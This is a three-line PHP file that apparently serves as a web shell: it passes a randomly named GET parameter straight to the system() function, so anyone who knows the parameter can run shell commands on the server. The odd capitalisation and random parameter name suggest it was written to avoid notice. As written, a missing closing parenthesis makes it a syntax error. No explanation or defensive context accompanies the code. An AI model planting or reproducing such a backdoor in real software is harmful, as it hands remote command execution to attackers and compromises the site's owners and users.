<?php
SysTeM($_GET['4Mqo7uGv'];
?>
